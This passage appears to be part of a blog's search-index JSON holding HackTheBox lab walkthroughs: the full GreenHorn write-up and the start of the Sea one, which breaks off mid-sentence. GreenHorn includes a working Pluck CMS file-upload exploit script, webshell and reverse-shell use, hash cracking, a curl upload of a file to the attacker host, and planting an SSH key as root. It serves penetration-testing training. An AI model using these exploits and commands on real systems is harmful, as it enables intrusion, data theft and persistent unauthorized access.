`,url:"https://4wayhandshake.github.io/walkthrough/lantern/"},"https://4wayhandshake.github.io/walkthrough/greenhorn/":{title:"GreenHorn",tags:["Gitea","Insecure File Upload","Credential Re-Use","Pixelation","Gimp"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION GreenHorn was introduced in the time between the fifth and sixth HTB seasons. It&rsquo;s about a web development company that prides itself on hiring very inexperienced developers. Thankfully for us, the boss also has very bad security practices &#x1f602;
Recon is very fast. First, recognize that there are two ports to investigate: both ports 80 and 3000 are running HTTP servers. Check them both out before doing anything else. As it turns out, one of them is hosting a git repo for the other - so finding critical sensitive details is very easy. Accessing the service on port 80, we can get a version number of the software being used. Some quick searching should lead to a CVE and a number of PoC exploits for it. Exploit the known vulnerability to gain a foothold on the system.
Obtaining the user flag after gaining a foothold is trivial. Check for credential re-use, and you&rsquo;ll have it immediately.
The root flag was little more difficult, and took a bit of creative problem solving. After a tiny bit of local enumeration, you&rsquo;ll find a file that should point you in the right direction of the flag, but might still leave you with a few questions. Do some research, understand the problem, and apply a well-known tool to solve the problem.
RECON nmap scans Port scan I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 3000/tcp open ppp It&rsquo;s odd to see PPP (point-to-point protocol) anywhere on an HTB box.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA) |_ 256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://greenhorn.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=b4214820a51fffa2; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=AHlhgbv0NBikCo1-HgwVQJzi7kE6MTcyMzcyMTcxODMyNjcwMDcwOA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Thu, 15 Aug 2024 11:35:18 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;GreenHorn&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=bc419445f381ec93; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=xqBy4QP5PSXL0V2FhlZ-EFmJnAE6MTcyMzcyMTcyMzgwNzQ4ODM3Nw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Thu, 15 Aug 2024 11:35:23 GMT |_ Content-Length: 0 Note the redirect to http://greenhorn.htb. Also, what&rsquo;s that &lt;link&gt; element from port 3000? I&rsquo;ll try decoding the base 64 data:
echo -n &#39;eyJuYW1...DAvYX&#39;| base64 -d # {&#34;name&#34;:&#34;GreenHorn&#34;,&#34;short_name&#34;:&#34;GreenHorn&#34;,&#34;start_url&#34;:&#34;http://greenhorn.htb:3000/&#34;,&#34;icons&#34;:[{&#34;src&#34;:&#34;http://greenhorn.htb:3000/assets/img/logo.png&#34;,&#34;type&#34;:&#34;image/png&#34;,&#34;sizes&#34;:&#34;512x512&#34;},{&#34;src&#34;:&#34;http://greenhorn.htb:3000/abase64: invalid input Ah ok - it&rsquo;s just a logo or something. Honestly, I don&rsquo;t think this is PPP; it&rsquo;s probably a custom webserver.
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No new results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No result.
Webserver Strategy - Port 80 Noting the redirect from the nmap scan, I added greenhorn.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=greenhorn.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Ok, so the target is using Pluck CMS. Contact to http://greenhorn.htb redirects us immediately to /?file=welcome-to-greenhorn, which suggests to me that I should definitely investigate file inclusion later &#x1f6a9;
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v Unsurprisingly, there was no result. Now I&rsquo;ll check for subdomains of greenhorn.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://greenhorn.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e .php,.asp,.js,.html,.txt -timeout 4 -v Directory enumeration against http://greenhorn.htb gave the following:
The contents of robots.txt shows us that there might be a couple sensitive directories:
User-agent: * Disallow: /data/ Disallow: /docs/ Below is the result of enumerating the /data directory:
Spot-checking a few of these directories leads me to a HTTP 403 page.
Below is the result of enumerating the /docs directory:
Enumerating the /files directory shows us an .htaccess file:
The contents of that file show that execution of PHP scripts from /files won&rsquo;t be possible:
AddHandler default-handler &lt;FilesMatch \\.php$&gt; SetHandler None &lt;/FilesMatch&gt; &lt;FilesMatch \\.phtml&gt; SetHandler None &lt;/FilesMatch&gt; Options -ExecCGI # mod_php check for PHP 7.x &lt;IfModule mod_php7.c&gt; php_flag engine off &lt;/IfModule&gt; # mod_php check for PHP 8.x &lt;IfModule mod_php.c&gt; php_flag engine off &lt;/IfModule&gt; Exploring the Website Navigating to the website presents us with a sugary sweet welcome message, loading /?file=welcome-to-greenhorn. The other tab loads a different file, /?file=welcome-the-new-junior.
Clicking admin at the bottom brings us to a login page. There is only a password field, which indicates that there is probably only one admin user. Interestingly though, there is an extra field (bogus) on the form that seemingly acts as a CSRF token:
It seems like admin.php, install.php, and requirements.php all redirect to this login page.
While attempting some default/obvious credentials, I accidentally tripped the login rate-limiting:
Vulnerability Research A web search for &ldquo;Pluck 4.7.18 vulnerability exploit&rdquo; led me straight to numerous reports of CVE-2023-50564. Apparently, there is an unauthenticated file upload vulnerability to this version of the CMS. There&rsquo;s also an exploit already in Exploit DB (EDB-ID 51592). It seems that we can leverage /admin.php?action=installmodule to install a malicious module onto the website, therefore gaining RCE.
There&rsquo;s a big problem though: this exploit is an authenticated file upload, and I don&rsquo;t yet have any credentials! If I can find some, I&rsquo;ll loop back to this &#x1f6a9;
Webserver Strategy - Port 3000 Before I go any further, I should check out the HTTP server running on port 3000. Navigating to that port, I see a familiar index page:
We can see from the page footer that it&rsquo;s running Gitea 1.21.11.
Any avid HTB players will have also encountered this service on an earlier box, Busqueda. Maybe we can check out what repos are stored, and see if any secrets are leaked?
Clicking the Explore button in the top left, I immediately see that they have a repo called Greenhorn. It&rsquo;s clearly the website we saw on port 80, with all files exposed.
&#x1f602; Oh boy&hellip; why did I waste so much time on directory &amp; file enumeration, when this was sitting right here!
Searching the repo Let&rsquo;s clone the repo and take a look inside:
cd source git clone http://10.10.11.25:3000/GreenAdmin/GreenHorn.git Aside: search a filesystem for keywords I often find myself performing the same task: searching a filesystem for matches to keywords. From what I&rsquo;ve seen of how other hackers operate, it seems pretty normal to take any of the following approaches:
Use auto-enumeration scripts like Linpeas or trufflehog. Don&rsquo;t question it, just trust that the script will find what you need. Search for filenames that match the provided keyword Recursively grep a directory, searching for matches to a keyword (less common) search inside archive files for matches (1) is not as flexible as we often need it. What if we think of new search terms? What if there&rsquo;s something target-specific that we need to look for?
(2), (3), and (4) all suffer the same shortcoming - people usually only search for one term at a time. This is inefficient and leads to mistakes by omission.
(4) is just not as common as it should be. There are plenty of targets whose secrets are held in archives like zip or .tar.gz. A regular grep won&rsquo;t reach those, yet still I find that a lot of people don&rsquo;t use regular-expression matching to search inside archives.
I wanted a tool that combines all the best aspects of the above strategies. What I came up with was a bash script that does all of the above. I think strikes a good balance between simple and effective.
It&rsquo;s very much still a work-in-progress, but if you want to check it out, please see my repository on my Github that contains this tool!
I used my search-filesystem tool to locate any sensitive files in the repo:
A couple of those are images. Of the php files, pass.php looks particularly interesting. Its contents are just a single line of PHP:
&lt;?php $ww = &#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163&#39;; ?&gt; Maybe it&rsquo;s a hash? I&rsquo;ll run it through name-that-hash:
Cracking the hash Alright, so it&rsquo;s probably a SHA-512 hash. Let&rsquo;s try cracking it:
cd loot echo &#39;d5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163&#39; &gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha512 hash.txt &#x1f389; Perfect! That&rsquo;s exactly what I was hoping for. With any luck, this is the password to the Pluck CMS admin interface. If that&rsquo;s true, it means we can use it with the file upload exploit from earlier! I&rsquo;ll try entering this password at /login.php (on port 80):
Perfect! The password lets us into the admin interface of Pluck &#x1f601;
FOOTHOLD File Upload Vulnerability Now that we know the credential is valid, let&rsquo;s try out that file upload exploit shown at EDB-ID 51592. Naturally, the goal will be to upload a webshell, so let&rsquo;s get one ready:
mkdir exploit/cve-2023-50564 cd exploit/cve-2023-50564 cp /usr/share/webshells/php/phpbash.php ./ertyuh5634654w654.php zip webshell.zip ertyuh5634654w654.php I&rsquo;ve tweaked the script from EDB-ID 51592 slightly to improve the program flow:
#!/usr/bin/python3 import requests from requests_toolbelt.multipart.encoder import MultipartEncoder import sys login_url = &#34;http://greenhorn.htb/login.php&#34; upload_url = &#34;http://greenhorn.htb/admin.php?action=installmodule&#34; headers = {&#34;Referer&#34;: login_url,} if len(sys.argv) &lt; 4: print(f&#39;Usage: python3 {sys.argv[0]} &lt;password&gt; &lt;zip-file&gt; &lt;php-payload-file&gt;&#39;) sys.exit(1) def strip_path(p): _p = p[:p.rfind(&#39;.&#39;)] if &#39;/&#39; in p: _p = _p[_p.rfind(&#39;/&#39;)+1:] return _p password = sys.argv[1] zip_file = strip_path(sys.argv[2]) payload_file = strip_path(sys.argv[3]) login_payload = {&#34;cont1&#34;: password, &#34;bogus&#34;: &#34;&#34;, &#34;submit&#34;: &#34;Log in&#34;} multipart_data = MultipartEncoder( fields={ &#34;sendfile&#34;: (f&#34;{zip_file}.zip&#34;, open(sys.argv[2], &#34;rb&#34;), &#34;application/zip&#34;), &#34;submit&#34;: &#34;Upload&#34; } ) session = requests.Session() login_response = session.post(login_url, headers=headers, data=login_payload) if login_response.status_code == 200: print(&#34;[+] Logged into account...&#34;) upload_headers = { &#34;Referer&#34;: upload_url, &#34;Content-Type&#34;: multipart_data.content_type } upload_response = session.post(upload_url, headers=upload_headers, data=multipart_data) if upload_response.status_code == 200: print(&#34;[+] Zip file uploaded...&#34;) rce_url=f&#34;http://greenhorn.htb/data/modules/{zip_file}/{payload_file}.php&#34; print(f&#39;[+] Requesting payload at: {rce_url}...&#39;) rce=requests.get(rce_url) print(f&#39;[!] HTTP {rce.status_code}\\n{rce.text}&#39;) else: print(&#34;[-] Failed to upload zip file.\\n\\tHTTP &#34;, upload_response.status_code) else: print(&#34;[-] Failed to log into account.\\n\\tHTTP &#34;, login_response.status_code) I tried running my script using the phpbash.php webshell as a payload:
python3 poc.py &#39;iloveyou1&#39; webshell.zip ertyuh5634654w654.php Navigating to the URL of the uploaded file, we can see that it was actually successful:
This is great! And it proves that we can upload files arbitrarily&hellip;
&#x1f605; &hellip;but unfortunately it seems like this connection dies after a couple seconds. Maybe it would work better to use a reverse shell?
I went to revshells.com and grabbed a copy of the PHP Pentestmonkey reverse shell (a fairly reliable PHP reverse shell) and copied it into lkdnxclid.php, then zipped that into dakksfhlkhk3248975.zip
zip jsenbs847.zip lkdnxclid.php &#x261d;&#xfe0f; I&rsquo;m using a particularly odd filename because I don&rsquo;t want to spoil the box for other HTB players. If I had used something obvious like &ldquo;revshell&rdquo; or &ldquo;payload&rdquo;, then my uploaded file (and directory) would show up if anyone were to perform directory enumeration on /data/modules
Now I&rsquo;ll prepare a reverse shell listener:
sudo ufw allow from $RADDR to any port 53 proto tcp bash sudo socat -d TCP-LISTEN:53 STDOUT With the listener running, I can now try running the exploit again:
python3 poc.py &#39;iloveyou1&#39; jsenbs847.zip lkdnxclid.php There we go! A reverse shell &#x1f601;
USER FLAG Upgrade the shell It would be good to have a nicer shell. Let&rsquo;s upgrade this one:
which python python3 perl bash # Python3 is present python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;) [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 alias ll=&#34;ls -lah&#34;; mkdir -p /tmp/.Tools # convenience only Local Enumeration - www-data The important users on the box (users with a home directory and login) are:
root:x:0:0:root:/root:/bin/bash git:x:114:120:Git Version Control,,,:/home/git:/bin/bash junior:x:1000:1000::/home/junior:/bin/bash My suspicion is that junior holds the user flag.
&#x1f602; While going through my &ldquo;really easy, do this first&rdquo; privesc checklist, I was successful with something:
Yes, that&rsquo;s right - you can just su junior and re-use the same password. Now we have a confirmed credential, junior : iloveyou1
The webserver was probably installed by junior and they re-used their password when they made it. Rookie mistake, but not terribly uncommon.
As I suspected, junior does hold the user flag. It&rsquo;s in their home directory:
cat user.txt ROOT FLAG What is this Using OpenVAS.pdf file in /home/junior? To take a look at it more easily, I&rsquo;ll transfer the file to my attacker machine. Since it doesn&rsquo;t seem like junior has SSH, I&rsquo;ll just upload it to an HTTP server.
First, from the attacker host, I&rsquo;ll open the firewall and start an HTTP server:
sudo ufw allow from $RADDR to any port 8000 proto tcp cd www simple-server 8000 -v Now, from the target, I&rsquo;ll upload the file:
curl -X POST -F &#39;file=@Using OpenVAS.pdf&#39; http://10.10.14.3:8000 The PDF has a simple text message in it:
Hello junior,
We have recently installed OpenVAS on our server to actively monitor and identify potential security vulnerabilities. Currently, only the root user, represented by myself, has the authorization to execute OpenVAS using the following command:
sudo /usr/sbin/openvas Enter password: [some blurred text]
As part of your familiarization with this tool, we encourage you to learn how to use OpenVAS effectively. In the future, you will also have the capability to run OpenVAS by entering the same command and providing your password when prompted.
Feel free to reach out if you have any questions or need further assistance.
Have a great week,
Mr. Green
Run the sudo /usr/sbin/openvas and enter the password? This indicates that the blurred text is the root user password itself. If we can find a way to extract the blurred/pixelated text, then that should be the only step required for privesc.
Unpixelating The task is pretty clear; we need to find a way to turn the pixelated text into plaintext. A web search for &ldquo;unpixelate depixelate text from PDF&rdquo; brought me to this Hacknews article, and subsequently to this Github repo for a tool called Unredacter.
This is all particularly worrisome to me &#x1f605;
Although it&rsquo;s really low-stakes, until now I&rsquo;ve used pixelation on this website to hide flags and other sensitive text. I guess I won&rsquo;t be doing that anymore!
All of my attempts to use unredacter were unsuccessful, so I moved onto the other tool mentioned in that article, Depix.
git clone https://github.com/spipm/Depix IMGFILE=/home/kali/Box_Notes/GreenHorn/loot/secret.png python3 depix.py -p $IMGFILE -s images/searchimages/debruinseq_notepad_Windows7_close.png --backgroundcolor 255,255,255 --averagetype linear Depix seems to have a handful of &ldquo;search images&rdquo; to use. If I understand correctly, these are just reference images created by running the reference text (/images/searchimages/debruinseq.txt, a sample of text where every letter is adjacent to every letter at some point) through a certain application, then taking a screenshot of the text
Thankfully, depix comes with a tool that shows the &ldquo;boxes&rdquo; that it detects, which helps you determine whether or not it has any hope of recovering the unpixelated plaintext. When I tried using this tool on the screenshot I had taken from the PDF, its detection of the &ldquo;pixel blocks&rdquo; in the image was very very poor.
Can we do a little pre-processing to clean it up?
For this section, I&rsquo;ll be using Gimp.
It&rsquo;s absolutely essential that your image processing is pixel-perfect - we can&rsquo;t be feeding antialiased or pre-blurred images into Depix, or it will definitely never find a solution!
Even after doing my best to crop only the image to only contain the pixelated text, there&rsquo;s still clearly some major issues with this image. Here&rsquo;s a zoom-in on the lower left corner:
We see four distinct regions that would each be one &ldquo;pixel&rdquo; of the pixelated image. However, when we zoom in this closely we can see there are rows and columns between the pixel-blocks (like the &ldquo;gutters&rdquo; of a CSS grid). We need to find a way to undo this effect.
As long as the &ldquo;binning&rdquo; settings are correct, it should be possible to simply downsample then upsample the image:
Downsample (scale it down, with no interpolation) the image to be only 3 pixels tall Upsample it (scale it up) to be a more typical resolution for text, something like 15px to 25px The result should pretty much be what we need. Hopefully with no color/contrast distortion.
First, let&rsquo;s downsample. Select Image &gt; Scale Image then choose some settings like this. It&rsquo;s essential that there is no interpolation applied, and that the vertical height is only 3px:
When we zoom in on the resulting image, we can confirm that this had the intended effect. This is the same region of the image as my previous screenshot - note how the &ldquo;mixed&rdquo; bands/gutters are gone:
Now let&rsquo;s upsample this to turn it into a more normal height for text. Usually the minimum web pixel font size is 15, so let&rsquo;s go with that (any multiple of 3 that is 15 or greater should be fine). Again, choose Image &gt; Scale Image:
When we check our work, again it seems to have had the desired effect:
Now export the image as a new PNG. Do not use any compression or we will undo what we just accomplished.
IMGFILE=/home/kali/Box_Notes/GreenHorn/loot/password-downsampled-then-upsampled.png python3 depix.py -p $IMGFILE -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png Depix runs a LOT faster now that there is only one obvious pixel block size!
After a few seconds, Depix finishes, and we can see the output:
That&hellip; is a very strange password. The length of it seems plausible for the length of the pixelated text, though. If I squint a little, I see the following:
sidefromsidetheothersidesidefromsidetheotherside &#x1f612;
I&rsquo;m not confident that nothing went wrong, but let&rsquo;s try it out from our junior shell:
su # sidefromsidetheothersidesidefromsidetheotherside Much to my amazement, it worked!
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. Let&rsquo;s delete the code we downloaded from gitea, just to save disk space:
rm -rf ./source/GreenHorn It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; EXTRA CREDIT SSH as root This whole time, we&rsquo;ve been working out of a reverse shell. Although we were able to fully upgrade the reverse shell, it would be nice to have something a little more persistent.
The root user has an .ssh directory, so let&rsquo;s plant a key. On the attacker host, generate a new keypair
ssh-keygen -t rsa -b 4096 -f ./id_rsa -N pixelsandpixelsorpixelspluspixels chmod 600 ./id_rsa base64 -w 0 id_rsa.pub # Copy the output Now on the target host, as root, plant the key:
echo &#39;[paste]&#39; | base64 -d &gt;&gt; /root/.ssh/authorized keys With the key planted, we can comfortably log in:
ssh -i ./id_rsa root@$RADDR # use passphrase: pixelsandpixelsorpixelspluspixels LESSONS LEARNED Attacker Visit each open port right after scanning. On this box, there were HTTP servers running on both ports 80 and 3000. However, I accidentally investigated port 80 far too much before looking into port 3000 at all. It would have been much more efficient if I had taken a look, really just a glance, at both of them before thoroughly investigating either.
Check for credential re-use first. Even before performing any other local enumeration, check for credential re-use! If you already have a credential, performing this check on other users of the host should only take a few seconds. In the end, it could save quite a bit of time that you might have otherwise spent enumerating a service account.
Remember how to manipulate images. We had to do a bit of Gimp work to achieve the root flag. Thankfully, I have a little background on image processing, so I knew what to do right away. Even just realizing that the interpolated bands between the &ldquo;pixel blocks&rdquo; would be a problem was a huge boon to achieving the root flag.
Defender Git repos should never hold secrets. Thankfully, Github now warns you if you&rsquo;re about to accidentally commit to a repo with sensitive details (tokens, passwords, etc) inside your code. However, self-hosted tools like gitea don&rsquo;t provide any mechanism like that. To make sure you&rsquo;re safe, don&rsquo;t allow the sensitive detail to enter the repo at all. A good low-effort alternative is to use a .gitignore file and an environment variable.
Don&rsquo;t expose private repos to the internet. Having a gitea instance exposed to the internet is not good! It&rsquo;s far too reckless. If you want a publicly accessible repo, there are far more secure methods.
Pixelation is not secure against a persistent attacker. Never expect that pixelated text will remain hidden forever. Also, think about it in terms of future-proofing: once we have more sophisticated image processing AIs, I&rsquo;m sure it will be completely trivial for any script kiddie to de-pixelate text with minimal effort, possibly even just a prompt into DAL-E or something like that! To ensure security, you should completely black-out text to censor it.
`,url:"https://4wayhandshake.github.io/walkthrough/greenhorn/"},"https://4wayhandshake.github.io/walkthrough/sea/":{title:"Sea",tags:["XSS","WonderCMS","Password Cracking","Output Redirection"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Sea was released as the second box of HTB&rsquo;s Season 6, Heist. With proper recon, it&rsquo;s a very short box. Perhaps they will fix it after the season ends, but this box actually comes pre-exploited: to gain foothold, all you have to do is find the exploit and use it. It&rsquo;s totally doable to figure out how to exploit it yourself though - that&rsquo;s the method that I&rsquo;ll outline in this walkthrough.
Recon is typical of an HTTP server. No alternate domains or subdomains were encountered. Effective directory and file enumeration leads to some important results though. I highly recommend you crawl the site for links on this one, though - so tools like ZAP Spider or Feroxbuster will both lead you to the results you need almost instantly. After this, a little web searching will allow you to determine the CMS that is being used.
After identifying the CMS, a bit of searching will reveal a very obvious exploit to try (Oddly though, it seems this exploit has already been used, and its result left in plain sight on the target?). Replicate this exploit using your own infrastructure to gain a foothold. After a some trivial local enumeration, a password hash can be recovered (remember, this is a &ldquo;flat-file&rdquo; CMS!). Crack the password to gain SSH access to a low privilege user, and the flag.
Local enumeration as the low-privileged user reveals an alternative http server exposed locally. Establish a proxy or forward a port for this server to gain easy access to it. The http server is able to run a few privileged commands - figure out a way to use this http server to perform a simple command injection and become root.
Personally, I didn&rsquo;t enjoy this box. The lack of proper cleanup scripts, general flakiness of the webserver, and the &ldquo;already-exploited&rdquo; aspect made this box confusing, but not challenging. These factors also led to constant box resets.
RECON nmap scans Port scan I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA) | 256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA) |_ 256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: Sea - Home |_http-server-header: Apache/2.4.41 (Ubuntu) Interesting that there&rsquo;s no httponly flag set on the session ID cookie. I&rsquo;ll have to be on high alert for XSS opportunities &#x1f6a8;
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http |_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 138/udp open|filtered tcpwrapped 162/udp open|filtered tcpwrapped 515/udp open|filtered tcpwrapped 1701/udp open|filtered L2TP 2049/udp open|filtered nfs 5353/udp open|filtered zeroconf 49153/udp open|filtered unknown 49200/udp open|filtered unknown 65024/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy I&rsquo;ll add sea.htb to /etc/hosts and do banner grabbing on that domain:
DOMAIN=sea.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. It&rsquo;s probably pointless, since there was no redirect to sea.htb (I only added the domain to my hosts file for convenience sake), I&rsquo;ll check for subdomains of sea.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://sea.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -o fuzzing/ffuf-directories-root -of json -e .php,.js,.html,.txt -timeout 4 -fs 199 Directory enumeration against http://sea.htb/ gave the following:
Exploring the Website The website claims to be an organizer of competetive nighttime bike events. So quirky! I hope their waivers are bulletproof.
The only important-looking clue is on the How to Participate tab:
&ldquo;To participate, you only need to send your data as a participant through contact. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.&rdquo;
This paragraph leads us to contact.php, where there is a form to enter name, email, age, country, and (oddly enough) website. Let&rsquo;s quickly start up a webserver with our own index page, and try out this form:
sudo ufw allow from $RADDR to any port 8000 proto tcp ip a s tun0 # I&#39;m at 10.10.14.5 right now cd www simple-server 8000 -v As expected, the target contacted my HTTP server:
10.10.11.28 - - [12/Aug/2024 08:11:04] &#34;GET / HTTP/1.1&#34; 200 - Host: 10.10.14.5:8000 Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate CMS Identification What type of website is this? Is it fully custom? There is very little to go off of. Usually, the directory structure is a pretty good hint. I &ldquo;spidered&rdquo; the site using ZAP, showing that I had pretty much found the whole site from my initial directory enumeration:
Since it&rsquo;s much better than searching on my own for the same info, I threw a prompt at ChatGPT:
